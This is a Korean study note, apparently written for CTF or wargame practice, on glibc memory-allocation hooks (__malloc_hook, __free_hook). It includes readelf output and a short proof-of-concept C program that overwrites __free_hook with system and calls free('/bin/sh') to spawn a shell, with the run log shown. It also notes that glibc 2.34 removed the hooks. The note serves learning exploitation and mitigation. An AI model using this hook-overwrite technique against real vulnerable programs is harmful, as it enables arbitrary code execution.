[[Memory Mitigation - RELRO]]
# 배경
- 훅, 훅킹
어떤 코드를 실행하려고 할 때, 다른 코드가 이를 낚아채 실행하는 것
함수에 훅을 심어서 함수의 호출을 모니터링 하거나, 함수에 기능을 추가할 수도 있고, 아니면 아예 다른 코드를 심어서 실행 흐름을 변조할 수도 있음
예를 들어, `malloc`과 `free`에 훅을 설치하면 소프트웨어에서 할당하고, 해제하는 메모리를 모니터링할 수 있음
이를 더욱 응용하면 모든 함수의 도입 부분에 모니터링 함수를 훅으로 설치하여 어떤 소프트웨어가 실행 중에 호출하는 함수를 모두 추적(Tracing)할 수도 있음

Glibc 2.33 이하 버전에서 libc 데이터 영역에는 `malloc()`과 `free()`를 호출할 때 함께 호출되는 훅(Hook)이 함수 포인터 형태로 존재
이 함수 포인터를 임의의 함수 주소로 오버라이트(Overwrite)하여 악의적인 코드를 실행

C언어에서 메모리의 동적 할당과 해제를 담당하는 함수로는 `malloc` , `free` , `realloc` 이 대표적, 모두 `libc.so` 에 구현되어 있음

```sh
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__libc_malloc|__libc_free|__libc_realloc"
   463: 00000000000970e0   923 FUNC    GLOBAL DEFAULT   13 __libc_malloc@@GLIBC_2.2.5
   710: 000000000009d100    33 FUNC    GLOBAL DEFAULT   13 __libc_reallocarray@@GLIBC_PRIVATE
  1619: 0000000000098ca0  1114 FUNC    GLOBAL DEFAULT   13 __libc_realloc@@GLIBC_2.2.5
  1889: 00000000000979c0  3633 FUNC    GLOBAL DEFAULT   13 __libc_free@@GLIBC_2.2.5
  1994: 000000000019a9d0   161 FUNC    GLOBAL DEFAULT   14 __libc_freeres@@GLIBC_2.2.5
```


`libc` 에는 이 함수들의 디버깅 편의를 위해 훅 변수가 정의되어 있음
`malloc` 함수는 `__malloc_hook` 변수의 값이 `NULL`이 아닌지 검사하고, 아니라면 `malloc`을 수행하기 전에 `__malloc_hook`이 가리키는 함수를 먼저 실행
이때, `malloc`의 인자는 훅 함수에 전달
같은 방식으로 `free`, `realloc`도 각각 `__free_hook`, `__realloc_hook`이라는 훅 변수를 사용

```c
// __malloc_hook
void *__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook); // malloc hook read
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0)); // call hook
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);
  // ...
}
```

섹션 헤더 정보를 참조하면 `libc.so` 의 `bss` 섹션에 포함됨을 알 수 있음
`bss` 섹션은 쓰기가 가능하므로 이 변수들의 값은 조작될 수 있음
```sh
$ readelf -S /lib/x86_64-linux-gnu/libc-2.27.so | grep -A 1 "\.bss" 
[35] .bss NOBITS 00000000003ec860 001ec860 
	0000000000004280 0000000000000000 WA 0 0 32
```

따라서 `malloc` , `free` , `realloc` 에는 각각에 대응되는 훅 변수가 존재하며, 앞서 설명한 바와 같이 이들은 `libc` 의 `bss` 섹션에 위치하여 실행 중에 덮어쓰는 것이 가능
또한, 훅을 실행할 때 기존 함수에 전달한 인자를 같이 전달해 주기 때문에 `__malloc_hook` 을 `system` 함수의 주소로 덮고, `malloc(“/bin/sh”)` 을 호출하여 셸을 획득하는 등의 공격이 가능

```c
// Name: fho-poc.c
// Compile: gcc -o fho-poc fho-poc.c

#include <malloc.h>
#include <stdlib.h>
#include <string.h>

const char *buf="/bin/sh";

int main() {
  printf("\"__free_hook\" now points at \"system\"\n");
  __free_hook = (void *)system;
  printf("call free(\"/bin/sh\")\n");
  free(buf);
}
```

실행결과
```sh
root@345d9a557d77:~/workspace# la
fho-poc  fho-poc.c
root@345d9a557d77:~/workspace# ./fho-poc 
"__free_hook" now points at "system"
call free("/bin/sh")
# la
/bin/sh: 1: la: not found
# ls
fho-poc  fho-poc.c
# ^C
# 
root@345d9a557d77:~/workspace# 
```

Full RLERO가 적용된 바이너리에도 라이브러리의 훅에는 쓰기 권한이 남아있기 때문에 이러한 공격을 고려해볼 수 있음

그러나 공격에 악용되기 쉽고, 훅은 힙 청크 할당(malloc)과 해제(free)가 다발적으로 일어나는 환경에서 성능에 악영향을 주기 때문에 보안과 성능 향상을 이유로 Glibc 2.34 버전부터 [제거](https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html#:~:text=*%20The%20deprecated%20memory,malloc%20interposition%20library.)됨


# 예시1
[[Dreamhack - fho]]
